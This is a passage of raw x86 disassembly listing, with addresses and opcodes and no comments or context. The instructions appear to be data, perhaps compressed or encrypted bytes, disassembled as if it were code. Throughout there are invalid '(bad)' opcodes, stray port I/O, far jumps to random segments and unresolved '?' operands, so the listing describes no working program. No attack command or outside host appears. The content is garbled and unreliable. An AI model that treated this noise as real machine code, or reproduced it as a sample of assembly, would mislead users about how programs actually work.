  6a2988:	lea    esp,[ebp-0x80]
  6a298b:	shl    edi,1
  6a298d:	(bad)  
  6a298e:	mov    ch,0x27
  6a2990:	xor    eax,0x8cdeb4e8
  6a2995:	js     0x6a2933
  6a2997:	mov    al,ds:0xf6fea0dd
  6a299c:	mov    esp,0xf06b4a24
  6a29a1:	ins    DWORD PTR es:[edi],dx
  6a29a2:	scas   al,BYTE PTR es:[edi]
  6a29a3:	cmp    BYTE PTR [ebp-0x18],bh
  6a29a6:	jmp    0xabf1:0x7c4a8245
  6a29ad:	push   esp
  6a29ae:	in     eax,dx
  6a29af:	sub    BYTE PTR [ecx],0x66
  6a29b2:	int    0x2e
  6a29b4:	dec    edi
  6a29b5:	shl    esi,1
  6a29b7:	(bad)  
  6a29b8:	loop   0x6a2a2b
  6a29ba:	lea    esi,[ecx]
  6a29bc:	jp     0x6a2a35
  6a29be:	mov    ds:0x496e9617,al
  6a29c3:	pop    esp
  6a29c4:	sub    bl,bh
  6a29c6:	dec    edi
  6a29c7:	mul    DWORD PTR ds:0x7f36b920
  6a29cd:	or     BYTE PTR [ebp-0x575df5f6],ch
  6a29d3:	mov    dh,0x49
  6a29d5:	dec    esi
  6a29d6:	gs adc al,0x51
  6a29d9:	inc    edx
  6a29da:	imul   esp,ecx,0x28
  6a29dd:	add    eax,0x4d784480
  6a29e2:	xchg   edi,eax
  6a29e3:	imul   ebx,DWORD PTR [ebx],0x13
  6a29e6:	inc    esp
  6a29e7:	jns    0x6a29cb
  6a29e9:	sub    al,0x84
  6a29eb:	out    dx,al
  6a29ec:	and    ecx,DWORD PTR [esi+0x52881f5a]
  6a29f2:	repz push edi
  6a29f4:	test   dl,cl
  6a29f6:	mov    BYTE PTR [esi-0x373e2987],ch
  6a29fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a29fd:	adc    al,0x9
  6a29ff:	cmp    al,0x33
  6a2a01:	enter  0x35a1,0xeb
  6a2a05:	hlt    
  6a2a06:	mov    ecx,0x2a115849
  6a2a0b:	inc    edi
  6a2a0c:	ret    0x45d2
  6a2a0f:	and    eax,0x203aeb6a
  6a2a14:	sbb    edx,DWORD PTR [edx+ebx*8]
  6a2a17:	test   DWORD PTR [eax],0x80985201
  6a2a1d:	test   eax,0x89042bc
  6a2a22:	sub    eax,DWORD PTR [ecx+0x221be14b]
  6a2a28:	retf   
  6a2a29:	push   ebp
  6a2a2a:	ret    0xbf91
  6a2a2d:	push   ss
  6a2a2e:	sbb    al,0xfb
  6a2a30:	int3   
  6a2a31:	dec    edi
  6a2a32:	mov    ah,0x18
  6a2a34:	inc    ebp
  6a2a35:	inc    edx
  6a2a36:	fsub   DWORD PTR [eax+0x6dc2c196]
  6a2a3c:	jmp    0xd746:0xb7f52307
  6a2a43:	cmp    ebx,DWORD PTR [edx+ebx*1]
  6a2a46:	adc    ch,dh
  6a2a48:	in     eax,0xb8
  6a2a4a:	test   BYTE PTR [ebx],al
  6a2a4c:	ret    0x58c8
  6a2a4f:	ins    BYTE PTR es:[edi],dx
  6a2a50:	and    esi,DWORD PTR [ebx]
  6a2a52:	into   
  6a2a53:	push   ebp
  6a2a54:	lea    edi,[edi]
  6a2a56:	ss lock das 
  6a2a59:	cmp    al,0x23
  6a2a5b:	js     0x6a2aba
  6a2a5d:	jnp    0x6a2ad4
  6a2a5f:	pop    ss
  6a2a60:	and    dh,BYTE PTR fs:[edi+ebx*4+0x48]
  6a2a65:	add    BYTE PTR [edi+ebp*8],bl
  6a2a68:	xchg   esi,eax
  6a2a69:	xor    ecx,DWORD PTR [ecx-0x1631f14]
  6a2a6f:	jae    0x6a2aad
  6a2a71:	nop
  6a2a72:	enter  0x952e,0xe0
  6a2a76:	mov    bl,ah
  6a2a78:	loope  0x6a2ab4
  6a2a7a:	inc    eax
  6a2a7b:	fimul  WORD PTR [edx+0x38a2ef4]
  6a2a81:	adc    al,ah
  6a2a83:	dec    edx
  6a2a84:	and    dl,dl
  6a2a86:	test   al,0x24
  6a2a88:	mov    eax,DWORD PTR [edx+0x234c17c6]
  6a2a8e:	mov    eax,0x9a2c9580
  6a2a93:	push   es
  6a2a94:	dec    edi
  6a2a95:	test   eax,0x201eec98
  6a2a9a:	ins    DWORD PTR es:[edi],dx
  6a2a9b:	je     0x6a2b13
  6a2a9d:	(bad)  
  6a2a9e:	bound  eax,QWORD PTR ds:0xd7c6765d
  6a2aa4:	cmp    edi,DWORD PTR [edi+edx*1-0x4950dceb]
  6a2aab:	stos   DWORD PTR es:[edi],eax
  6a2aac:	cmp    eax,0xb263a63d
  6a2ab1:	xor    edi,ecx
  6a2ab3:	(bad)  
  6a2ab4:	hlt    
  6a2ab5:	rcl    BYTE PTR [ebx+0x61b77101],cl
  6a2abb:	aas    
  6a2abc:	xchg   DWORD PTR [eax-0x2],edi
  6a2abf:	jmp    0x39ba:0xa7c1c613
  6a2ac6:	add    al,0x95
  6a2ac8:	call   0x58db:0x76863cf5
  6a2acf:	scas   al,BYTE PTR es:[edi]
  6a2ad0:	xchg   edx,eax
  6a2ad1:	pusha  
  6a2ad2:	enter  0xee4d,0xa4
  6a2ad6:	adc    ah,BYTE PTR [ebx]
  6a2ad8:	push   edx
  6a2ad9:	(bad)  
  6a2ada:	nop
  6a2adb:	std    
  6a2adc:	das    
  6a2add:	pop    ecx
  6a2ade:	arpl   WORD PTR [edi+0x31],di
  6a2ae1:	retf   0x659a
  6a2ae4:	ret    0xf7eb
  6a2ae7:	jns    0x6a2a6c
  6a2ae9:	jae    0x6a2a76
  6a2aeb:	mov    al,0x77
  6a2aed:	ret    
  6a2aee:	mov    ch,0x87
  6a2af0:	mov    edx,0xd1bd8131
  6a2af5:	sub    al,0xba
  6a2af7:	xchg   ebp,eax
  6a2af8:	sub    eax,0x4dc44a6b
  6a2afd:	jp     0x6a2a8a
  6a2aff:	out    0xc5,eax
  6a2b01:	out    0x85,al
  6a2b03:	in     eax,0x54
  6a2b05:	push   ds
  6a2b06:	pusha  
  6a2b07:	pop    es
  6a2b08:	lock push ebp
  6a2b0a:	ficomp DWORD PTR [esi]
  6a2b0c:	dec    eax
  6a2b0d:	cmc    
  6a2b0e:	in     al,0xf6
  6a2b10:	mov    ds:0xfc210bae,eax
  6a2b15:	(bad)  
  6a2b16:	xor    BYTE PTR [ebp-0x4cfe1d98],bl
  6a2b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a2b1d:	inc    edi
  6a2b1e:	jmp    0x6a2ae0
  6a2b20:	int3   
  6a2b21:	outs   dx,BYTE PTR ds:[esi]
  6a2b22:	lahf   
  6a2b23:	hlt    
  6a2b24:	push   edx
  6a2b25:	add    DWORD PTR gs:[ebx+0x44],0xffffffe6
  6a2b2a:	div    BYTE PTR [ecx-0x63]
  6a2b2d:	mov    bl,0x7
  6a2b2f:	mov    ds,WORD PTR es:[ebp+0x2c]
  6a2b33:	xchg   ebp,eax
  6a2b34:	inc    al
  6a2b36:	daa    
  6a2b37:	ret    0x494b
  6a2b3a:	cmp    edi,ebx
  6a2b3c:	out    dx,al
  6a2b3d:	push   es
  6a2b3e:	cmp    eax,0x1768ef0e
  6a2b43:	mov    esi,0xb090c756
  6a2b48:	(bad)  
  6a2b49:	test   al,0xea
  6a2b4b:	pop    eax
  6a2b4c:	lahf   
  6a2b4d:	fisttp DWORD PTR [ecx+0x52]
  6a2b50:	sbb    eax,0xa5e5cde8
  6a2b55:	xor    eax,0xb15f245b
  6a2b5a:	fld    TBYTE PTR [ecx-0x8]
  6a2b5d:	xor    BYTE PTR [eax+0x28],cl
  6a2b60:	test   esi,ebx
  6a2b62:	stc    
  6a2b63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a2b64:	xchg   esi,eax
  6a2b65:	stc    
  6a2b66:	std    
  6a2b67:	clc    
  6a2b68:	sub    ch,BYTE PTR [edx-0x4cccabf5]
  6a2b6e:	call   0x1107:0x7e093741
  6a2b75:	enter  0xca5,0x26
  6a2b79:	loopne 0x6a2b50
  6a2b7b:	add    cl,BYTE PTR [ebp+0x173236c3]
  6a2b81:	cld    
  6a2b82:	jnp    0x6a2b63
  6a2b84:	sub    eax,DWORD PTR [edi-0x7a46b0b6]
  6a2b8a:	cwde   
  6a2b8b:	inc    eax
  6a2b8c:	or     al,0xdd
  6a2b8e:	add    ebx,DWORD PTR [edx+0x1f6d7489]
  6a2b94:	jne    0x6a2ba4
  6a2b96:	inc    esi
  6a2b97:	xchg   ecx,eax
  6a2b98:	pop    esp
  6a2b99:	stos   BYTE PTR es:[edi],al
  6a2b9a:	mov    ecx,0x4cea1ed6
  6a2b9f:	cmp    eax,0xd174aa23
  6a2ba4:	into   
  6a2ba5:	jno    0x6a2bb2
  6a2ba7:	push   cs
  6a2ba8:	sub    al,0xa
  6a2baa:	mov    esi,0x726aa19f
  6a2baf:	jbe    0x6a2c2b
  6a2bb1:	mov    ah,0xd8
  6a2bb3:	shl    BYTE PTR [ebx],0xb5
  6a2bb6:	(bad)  
  6a2bb8:	add    ch,ch
  6a2bba:	adc    ebx,DWORD PTR [ebx]
  6a2bbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a2bbd:	push   ebx
  6a2bbe:	mov    ds:0x3e779e15,eax
  6a2bc3:	pop    ecx
  6a2bc4:	in     al,0x95
  6a2bc6:	jo     0x6a2c27
  6a2bc8:	out    dx,al
  6a2bc9:	xor    edi,DWORD PTR [ebp+eiz*2+0x41]
  6a2bcd:	inc    ecx
  6a2bce:	mov    eax,DWORD PTR [edi-0x3f9e3f8d]
  6a2bd4:	jns    0x6a2c45
  6a2bd6:	xchg   ebx,eax
  6a2bd7:	inc    BYTE PTR ds:0xb8f54b94
  6a2bdd:	sub    ecx,DWORD PTR [ebx-0x25]
  6a2be0:	in     al,0xc5
  6a2be2:	mov    ecx,0x42ee2528
  6a2be7:	pop    edx
  6a2be8:	outs   dx,DWORD PTR ds:[esi]
  6a2be9:	in     al,dx
  6a2bea:	fmul   QWORD PTR [esi+0x7a7882fc]
  6a2bf0:	add    al,0xc2
  6a2bf2:	xchg   edx,eax
  6a2bf3:	pop    edi
  6a2bf4:	out    0x21,eax
  6a2bf6:	loopne 0x6a2bdb
  6a2bf8:	adc    ebp,ecx
  6a2bfa:	mov    dh,0x5d
  6a2bfc:	fld    TBYTE PTR [esi-0x7b]
  6a2bff:	mov    bh,BYTE PTR [edx+0x43d41cae]
  6a2c05:	fdiv   QWORD PTR ds:0x352ffaee
  6a2c0b:	repnz test eax,0x8e92ef4c
  6a2c11:	(bad)  
  6a2c12:	in     al,0xf4
  6a2c14:	bound  esi,QWORD PTR [ebx]
  6a2c16:	add    al,0x1e
  6a2c18:	aaa    
  6a2c19:	xchg   ebp,eax
  6a2c1a:	outs   dx,DWORD PTR ds:[esi]
  6a2c1b:	jle    0x6a2c6d
  6a2c1d:	out    0x82,eax
  6a2c1f:	(bad)  
  6a2c20:	(bad)  
  6a2c21:	or     DWORD PTR [edi],0xc7c1f9c1
  6a2c27:	cmp    ah,BYTE PTR [edi-0x6f80fcf3]
  6a2c2d:	adc    eax,0xc388c4be
  6a2c32:	and    BYTE PTR fs:[edi],ch
  6a2c35:	imul   ebp,DWORD PTR [edx+0x3b],0xffffff94
  6a2c39:	gs nop
  6a2c3b:	imul   eax,DWORD PTR [ebx+ebx*2-0x66],0x6e286410
  6a2c43:	(bad)  
  6a2c44:	aam    0xa5
  6a2c46:	add    DWORD PTR ds:0x406a3c43,0x1e81fe6
  6a2c50:	lahf   
  6a2c51:	pop    edx
  6a2c52:	call   0xa186:0xa5a41c
  6a2c59:	and    BYTE PTR ds:0x7a5c,bl
  6a2c5e:	jns    0x6a2c00
  6a2c60:	outs   dx,BYTE PTR ds:[esi]
  6a2c61:	cli    
  6a2c62:	sbb    DWORD PTR [edi],edi
  6a2c64:	xchg   ebp,eax
  6a2c65:	xlat   BYTE PTR ds:[ebx]
  6a2c66:	cmp    BYTE PTR [eax-0x10950da7],bh
  6a2c6c:	test   DWORD PTR [eax+0x6df3ba0a],edx
  6a2c72:	mov    cl,0xd3
  6a2c74:	cmp    eax,0xdb44d5e2
  6a2c79:	icebp  
  6a2c7a:	arpl   WORD PTR [edi],sp
  6a2c7c:	adc    bh,BYTE PTR [esi+0x9]
  6a2c7f:	mov    eax,0xc2fe5497
  6a2c84:	ret    0xb788
  6a2c87:	and    al,0xbb
  6a2c89:	push   ds
  6a2c8a:	pop    ds
  6a2c8b:	add    al,BYTE PTR [edx+ebp*8]
  6a2c8e:	not    ecx
  6a2c90:	dec    eax
  6a2c91:	push   edi
  6a2c92:	push   ebx
  6a2c93:	mov    eax,0x9f88c3a6
  6a2c98:	sar    DWORD PTR ds:0x384c7279,1
  6a2c9f:	xchg   ebp,eax
  6a2ca0:	pop    es
  6a2ca1:	dec    esp
  6a2ca2:	jp     0x6a2c9e
  6a2ca4:	dec    eax
  6a2ca5:	mov    DWORD PTR [ebx+0x6372fa72],ebp
  6a2cab:	push   es
  6a2cac:	call   0xd89a:0x57ed53cd
  6a2cb3:	add    al,0x9b
  6a2cb6:	aad    0xef
  6a2cb8:	dec    edi
  6a2cb9:	not    bh
  6a2cbb:	jo     0x6a2d28
  6a2cbd:	and    eax,0x279c32ec
  6a2cc2:	adc    esp,DWORD PTR [esi+0x38]
  6a2cc5:	or     al,0xe0
  6a2cc7:	lea    ecx,[eax+0x32]
  6a2cca:	fld    st(0)
  6a2ccc:	lahf   
  6a2ccd:	dec    eax
  6a2cce:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a2cd0:	out    dx,al
  6a2cd1:	fcmovbe st,st(4)
  6a2cd3:	pop    eax
  6a2cd4:	xchg   BYTE PTR [edx-0x71],dl
  6a2cd7:	or     al,0x6a
  6a2cd9:	sahf   
  6a2cda:	lods   al,BYTE PTR ds:[esi]
  6a2cdb:	and    al,BYTE PTR [edx+ebp*1]
  6a2cde:	add    BYTE PTR [ecx+0x17],dl
  6a2ce1:	repz inc ebx
  6a2ce3:	pop    ebp
  6a2ce4:	out    0x7c,eax
  6a2ce6:	pop    esp
  6a2ce7:	xchg   edi,eax
  6a2ce8:	dec    esi
  6a2ce9:	xor    al,0x22
  6a2ceb:	mov    DWORD PTR [ecx-0x3fcf5ecb],edi
  6a2cf1:	adc    eax,0x5d1b9ed6
  6a2cf6:	jns    0x6a2cf4
  6a2cf8:	dec    eax
  6a2cf9:	sub    al,0xdd
  6a2cfb:	push   0xffffff95
  6a2cfd:	aam    0x15
  6a2cff:	enter  0x2462,0xf0
  6a2d03:	xchg   edx,eax
  6a2d04:	stc    
  6a2d05:	lahf   
  6a2d06:	add    al,0xf0
  6a2d08:	inc    ecx
  6a2d09:	outs   dx,DWORD PTR ds:[esi]
  6a2d0a:	xchg   BYTE PTR [ebp+edi*8-0x754923a7],bl
  6a2d11:	mov    eax,0xad4ad701
  6a2d16:	shl    bl,0xb3
  6a2d19:	jae    0x6a2d17
  6a2d1b:	lods   eax,DWORD PTR ds:[esi]
  6a2d1c:	cli    
  6a2d1d:	inc    ebp
  6a2d1e:	arpl   WORD PTR [eax+ecx*4+0x7],dx
  6a2d22:	adc    BYTE PTR [edi+0x41],cl
  6a2d25:	(bad)
  6a2d28:	ss nop
  6a2d2a:	mov    DWORD PTR [ecx-0x2c80c859],ebx
  6a2d30:	cmp    ax,0xb753
  6a2d34:	sub    cl,BYTE PTR [edx]
  6a2d36:	or     ch,BYTE PTR [edi+0x22]
  6a2d39:	jne    0x6a2d91
  6a2d3b:	pop    edi
  6a2d3c:	adc    al,0x8f
  6a2d3e:	outs   dx,BYTE PTR ds:[esi]
  6a2d3f:	push   0xffffffb3
  6a2d41:	mov    ds:0x5186575,eax
  6a2d46:	mov    al,ds:0xe88d9c71
  6a2d4b:	mov    bh,0x3c
  6a2d4d:	int    0x1a
  6a2d4f:	sbb    dh,BYTE PTR [edi+0x36acc7f4]
  6a2d55:	fadd   QWORD PTR [ebx]
  6a2d57:	jle    0x6a2d2f
  6a2d59:	mov    ds:0xaf8ef0c,al
  6a2d5e:	jecxz  0x6a2db6
  6a2d60:	push   0x7f896c2
  6a2d65:	or     cl,0xe6
  6a2d68:	add    BYTE PTR [esi-0x11],dl
  6a2d6b:	jns    0x6a2d7c
  6a2d6d:	je     0x6a2dba
  6a2d6f:	test   al,0x68
  6a2d71:	dec    ebp
  6a2d72:	bound  ecx,QWORD PTR [edi-0xc]
  6a2d75:	sub    al,0xac
  6a2d77:	fimul  WORD PTR [edx-0x4b7964e3]
  6a2d7d:	push   edx
  6a2d7e:	mov    dl,0xec
  6a2d80:	test   eax,0x310299b5
  6a2d85:	dec    ebp
  6a2d86:	sbb    edi,ecx
  6a2d88:	xor    DWORD PTR [esi],0xffffffe1
  6a2d8b:	sbb    al,0x78
  6a2d8d:	out    dx,al
  6a2d8e:	xchg   cl,dh
  6a2d90:	jmp    0x62bb:0x17291832
  6a2d97:	push   esi
  6a2d98:	xor    BYTE PTR [ebx-0x14],0x1c
  6a2d9c:	cmp    BYTE PTR [ebx-0x3e828a8c],dl
  6a2da2:	fucomip st,st(3)
  6a2da4:	hlt    
  6a2da5:	cmp    ecx,DWORD PTR [ecx-0x3e]
  6a2da8:	fcmovb st,st(1)
  6a2daa:	mov    ch,0xfe
  6a2dac:	dec    esi
  6a2dad:	(bad)  
  6a2dae:	shr    BYTE PTR [edi],cl
  6a2db0:	fdiv   QWORD PTR [edx-0xa]
  6a2db3:	in     eax,0x6e
  6a2db5:	or     BYTE PTR [edx+0xf],ch
  6a2db8:	dec    esp
  6a2db9:	jbe    0x6a2de3
  6a2dbb:	xor    al,0x47
  6a2dbd:	in     eax,dx
  6a2dbe:	nop
  6a2dbf:	js     0x6a2de0
  6a2dc1:	ds loop 0x6a2d58
  6a2dc4:	sbb    dl,ah
  6a2dc6:	fnstenv [eax-0x7e8b07c6]
  6a2dcc:	jecxz  0x6a2d94
  6a2dce:	jb     0x6a2dd4
  6a2dd0:	int3   
  6a2dd1:	pusha  
  6a2dd2:	stc    
  6a2dd3:	fs pop ecx
  6a2dd5:	sti    
  6a2dd6:	(bad)  
  6a2dd7:	cmc    
  6a2dd8:	jo     0x6a2da9
  6a2dda:	addr16 popf 
  6a2ddc:	je     0x6a2de3
  6a2dde:	stos   DWORD PTR es:[edi],eax
  6a2ddf:	push   0x7f
  6a2de1:	pop    ds
  6a2de2:	dec    DWORD PTR [ebp+0x4a]
  6a2de5:	stc    
  6a2de6:	idiv   DWORD PTR [esi-0x15]
  6a2de9:	mov    ch,0xe8
  6a2deb:	loop   0x6a2dc1
  6a2ded:	cmp    eax,0x3f1e0fa8
  6a2df2:	cs push 0xffffff82
  6a2df5:	cwde   
  6a2df6:	fnstcw WORD PTR [esi+0x7230445a]
  6a2dfc:	xor    ebx,eax
  6a2dfe:	sub    al,al
  6a2e00:	out    dx,eax
  6a2e01:	xchg   edi,eax
  6a2e02:	stos   DWORD PTR es:[edi],eax
  6a2e03:	test   eax,0x4f9396aa
  6a2e08:	push   0x61
  6a2e0a:	cmc    
  6a2e0b:	mov    ah,0xfa
  6a2e0d:	popf   
  6a2e0e:	(bad)  
  6a2e10:	adc    DWORD PTR [esi],0xbf5a82d2
  6a2e16:	mov    WORD PTR [ebp+0x1e],?
  6a2e19:	es aam 0xe5
  6a2e1c:	jo     0x6a2e79
  6a2e1e:	push   esp
  6a2e1f:	sub    BYTE PTR ds:0x15022a69,al
  6a2e25:	or     dl,bl
  6a2e27:	loopne 0x6a2e4b
  6a2e29:	aaa    
  6a2e2a:	adc    eax,0x44c34ad7
  6a2e2f:	mov    ebp,0xba33e3e9
  6a2e34:	add    DWORD PTR [ebp-0x3bb6a240],ebx
  6a2e3a:	jne    0x6a2e2f
  6a2e3c:	mov    eax,0x301ccc65
  6a2e41:	js     0x6a2e22
  6a2e43:	sar    esi,0xd9
  6a2e46:	xchg   edi,eax
  6a2e47:	adc    eax,0xe0904677
  6a2e4c:	inc    ebp
  6a2e4d:	add    BYTE PTR [ebx-0x3a],dh
  6a2e50:	cmp    eax,0x30332612
  6a2e55:	jae    0x6a2e31
  6a2e57:	xchg   edi,eax
  6a2e58:	adc    al,0x25
  6a2e5a:	mov    es,WORD PTR [ebp+0x1c]
  6a2e5d:	(bad)  
  6a2e5e:	loopne 0x6a2e18
  6a2e60:	add    DWORD PTR [eax+0x79],edx
  6a2e63:	jle    0x6a2e84
  6a2e65:	mov    eax,ds:0x84827ed2
  6a2e6a:	shl    dl,1
  6a2e6c:	pop    edi
  6a2e6d:	sbb    eax,0x70355fbd
  6a2e72:	push   es
  6a2e73:	lock mov WORD PTR [ebp+0x3f],?
  6a2e77:	mov    bl,0x83
  6a2e79:	lds    ecx,FWORD PTR [ebx+0x2d]
  6a2e7c:	mov    DWORD PTR [edx],0xa2cb4940
  6a2e82:	xlat   BYTE PTR ds:[ebx]
  6a2e83:	cli    
  6a2e84:	and    DWORD PTR [eax+0x47],ebp
  6a2e87:	and    edi,DWORD PTR [edi+0x317bc867]
  6a2e8d:	ss push ecx
  6a2e8f:	xchg   BYTE PTR ds:0x986f5015,ah
  6a2e95:	inc    eax
  6a2e96:	xor    eax,edi
  6a2e98:	fadd   QWORD PTR [edi+0x25]
  6a2e9b:	stos   BYTE PTR es:[edi],al
  6a2e9c:	mov    ds:0x7d08d99a,al
  6a2ea1:	test   al,0xe3
  6a2ea3:	pop    ebx
  6a2ea4:	mov    bh,0x99
  6a2ea6:	pop    esp
  6a2ea7:	fcomp  DWORD PTR [eax+0x5e]
  6a2eaa:	arpl   WORD PTR [edi],cx
  6a2eac:	adc    ah,al
  6a2eae:	test   eax,ebx
  6a2eb0:	(bad)  
  6a2eb1:	loopne 0x6a2ee1
  6a2eb3:	rcr    BYTE PTR [esi+0x71],cl
  6a2eb6:	mov    esp,eax
  6a2eb8:	pop    es
  6a2eb9:	fisttp QWORD PTR ds:0x74b58fa3
  6a2ebf:	push   esi
  6a2ec0:	ret    
  6a2ec1:	ret    
  6a2ec2:	adc    dl,bh
  6a2ec4:	pop    ds
  6a2ec5:	mov    bh,0x23
  6a2ec7:	or     al,0x4b
  6a2ec9:	sbb    cl,bh
  6a2ecb:	test   al,0x69
  6a2ecd:	ret    0x58c1
  6a2ed0:	sbb    ch,ch
  6a2ed2:	imul   edx,DWORD PTR [edx+0x51784f39],0x918d1f6e
  6a2edc:	popa   
  6a2edd:	pop    ebp
  6a2ede:	out    0x93,eax
  6a2ee0:	push   es
  6a2ee1:	gs push eax
  6a2ee3:	sub    al,0x17
  6a2ee5:	jmp    0x951e30f2
  6a2eea:	in     al,0x1f
  6a2eec:	lods   al,BYTE PTR gs:[esi]
  6a2eee:	add    al,0xc4
  6a2ef0:	push   edi
  6a2ef1:	fdivr  st(2),st
  6a2ef3:	outs   dx,BYTE PTR ds:[esi]
  6a2ef4:	mov    dl,0x8b
  6a2ef6:	xor    BYTE PTR [edi+0x21],ch
  6a2ef9:	inc    edi
  6a2efa:	std    
  6a2efb:	xor    DWORD PTR [ebp+0x28],ebp
  6a2efe:	push   eax
  6a2eff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a2f00:	push   es
  6a2f01:	sar    DWORD PTR [ebx-0x38],1
  6a2f04:	add    al,0xfc
  6a2f06:	jmp    0x6d8b975a
  6a2f0b:	stc    
  6a2f0c:	popa   
  6a2f0d:	mov    ?,WORD PTR [edi-0x35e5223d]
  6a2f13:	aad    0xfb
  6a2f15:	adc    BYTE PTR [ebx],dl
  6a2f17:	cmc    
  6a2f18:	neg    DWORD PTR [esi-0x1163ada7]
  6a2f1e:	int3   
  6a2f1f:	add    DWORD PTR [ebx-0x5d],ebp
  6a2f22:	in     eax,dx
  6a2f23:	mov    DWORD PTR [esi],ebp
  6a2f25:	sbb    eax,0x4dd3c1e4
  6a2f2a:	or     BYTE PTR [edx+0x65],dl
  6a2f2d:	mov    eax,0xe5850b6
  6a2f32:	daa    
  6a2f33:	rcr    bl,1
  6a2f35:	or     BYTE PTR ds:0x28dfde6a,bh
  6a2f3b:	loop   0x6a2f1f
  6a2f3d:	push   ds
  6a2f3e:	sbb    eax,0xb944f49d
  6a2f43:	arpl   WORD PTR [eax],bx
  6a2f45:	fidiv  WORD PTR [ecx+esi*4+0x2db7ca99]
  6a2f4c:	mov    bl,0xd3
  6a2f4e:	or     dh,BYTE PTR [ecx-0xe26abd]
  6a2f54:	mov    dh,0x15
  6a2f56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a2f57:	test   BYTE PTR [esi-0x41],0xa0
  6a2f5b:	push   ebx
  6a2f5c:	add    edi,DWORD PTR [esi]
  6a2f5e:	xchg   ebp,eax
  6a2f5f:	mov    ebx,0xb74c7b68
  6a2f64:	xor    eax,0x24ab5fd8
  6a2f69:	mov    dl,BYTE PTR [ebp-0x63dd0cd6]
  6a2f6f:	mov    cl,0xf7
  6a2f71:	test   BYTE PTR [esi+0x721666cc],0xdd
  6a2f78:	and    bl,BYTE PTR [edx-0x5e3b5623]
  6a2f7e:	in     eax,0x95
  6a2f80:	jge    0x6a2f50
  6a2f82:	out    dx,al
  6a2f83:	(bad)  
  6a2f84:	jnp    0x6a2f9f
  6a2f86:	fadd   st,st(4)
  6a2f88:	xchg   bl,ch
  6a2f8a:	ficom  WORD PTR [edi]
  6a2f8c:	cmp    al,0x28
  6a2f8e:	ret    
  6a2f8f:	enter  0xd41a,0xed
  6a2f93:	shr    ah,0x92
  6a2f96:	test   al,0xe4
  6a2f98:	retf   
  6a2f99:	mov    ebp,0x7bdeaba0
  6a2f9e:	ins    BYTE PTR es:[edi],dx
  6a2f9f:	rcr    BYTE PTR [ebp+0x15],cl
  6a2fa2:	mov    cl,0xe1
  6a2fa4:	add    ebx,edi
  6a2fa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a2fa7:	and    ebp,eax
  6a2fa9:	pop    edi
  6a2faa:	jecxz  0x6a3028
  6a2fac:	sar    ecx,1
  6a2fae:	clc    
  6a2faf:	sub    DWORD PTR [esi+edi*2],esp
  6a2fb2:	dec    edi
  6a2fb3:	xor    dh,BYTE PTR [ecx+eax*8]
  6a2fb6:	pusha  
  6a2fb7:	mov    cl,0x9b
  6a2fb9:	cmp    ah,dh
  6a2fbb:	mov    ah,0xfc
  6a2fbd:	std    
  6a2fbe:	xor    BYTE PTR [edi-0x80],ah
  6a2fc1:	pop    ebp
  6a2fc2:	jb     0x6a2fe8
  6a2fc4:	(bad)  
  6a2fc5:	mov    esp,0xa87c34b0
  6a2fca:	push   eax
  6a2fcb:	mov    ecx,0x496c9495
  6a2fd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a2fd1:	xor    cl,BYTE PTR [eax+ebp*1-0x6b]
  6a2fd5:	add    al,0x67
  6a2fd7:	xchg   esp,eax
  6a2fd8:	imul   eax,esi,0x3de0e1fd
  6a2fde:	pop    ds
  6a2fdf:	sub    BYTE PTR [ecx-0x54066b29],0xee
  6a2fe6:	mov    al,ds:0xf1ef1de4
  6a2feb:	pop    ebx
  6a2fec:	jno    0x6a3037
  6a2fee:	xchg   DWORD PTR [esi],ebx
  6a2ff0:	dec    ebp
  6a2ff1:	pop    ebx
  6a2ff2:	jnp    0x6a3006
  6a2ff4:	xchg   ebx,eax
  6a2ff5:	aam    0x7
  6a2ff7:	xchg   ecx,eax
  6a2ff8:	fild   QWORD PTR [ebp-0xb]
  6a2ffb:	fidiv  WORD PTR [esp+edi*8-0x3132f823]
  6a3002:	push   ebx
  6a3003:	(bad)  [ecx+esi*8]
  6a3006:	stos   BYTE PTR es:[edi],al
  6a3007:	cmp    DWORD PTR [ebx],ecx
  6a3009:	mov    eax,ds:0xf828c247
  6a300e:	adc    dh,BYTE PTR [ebx+edi*8+0xc]
  6a3012:	fdivrp st(1),st
  6a3014:	fstp   DWORD PTR [edi+0x63e1eb2e]
  6a301a:	loop   0x6a3067
  6a301c:	aam    0x2e
  6a301e:	xchg   esp,eax
  6a301f:	in     eax,dx
  6a3020:	mov    cs,eax
  6a3022:	mov    ?,WORD PTR [eax-0x38]
  6a3025:	mov    al,0x9
  6a3027:	outs   dx,BYTE PTR ds:[esi]
  6a3028:	fild   QWORD PTR [ebx]
  6a302a:	add    al,0x4f
  6a302c:	stc    
  6a302d:	push   edx
  6a302e:	in     eax,0xa6
  6a3030:	sbb    eax,0x6569b23
  6a3035:	mov    WORD PTR [eax+0x54],ss
  6a3038:	jge    0x6a3042
  6a303a:	(bad)  
  6a303c:	sar    DWORD PTR [edx],1
  6a303e:	or     al,0x99
  6a3040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a3041:	dec    eax
  6a3042:	out    0x77,al
  6a3044:	ds dec esi
  6a3046:	pop    eax
  6a3047:	add    bl,BYTE PTR [esi-0x7a7be3d8]
  6a304d:	in     eax,dx
  6a304e:	ja     0x6a308e
  6a3050:	cmp    DWORD PTR [esi],ebp
  6a3052:	push   ecx
  6a3053:	push   ebp
  6a3054:	(bad)  
  6a3055:	imul   DWORD PTR [ebp-0x5e601804]
  6a305b:	not    DWORD PTR [edi]
  6a305d:	loope  0x6a306f
  6a305f:	imul   eax,DWORD PTR [ebx-0x52298a0d],0x8
  6a3066:	adc    dl,ch
  6a3068:	sar    DWORD PTR [esp+edx*8-0x44],cl
  6a306c:	add    DWORD PTR [esi],edx
  6a306e:	popa   
  6a306f:	mov    dl,0x68
  6a3071:	lea    eax,[edx]
  6a3073:	cmp    eax,0x6b93506d
  6a3078:	sub    ch,BYTE PTR [edx]
  6a307a:	in     al,dx
  6a307b:	pop    ebp
  6a307c:	lahf   
  6a307d:	dec    edx
  6a307e:	jae    0x6a30b4
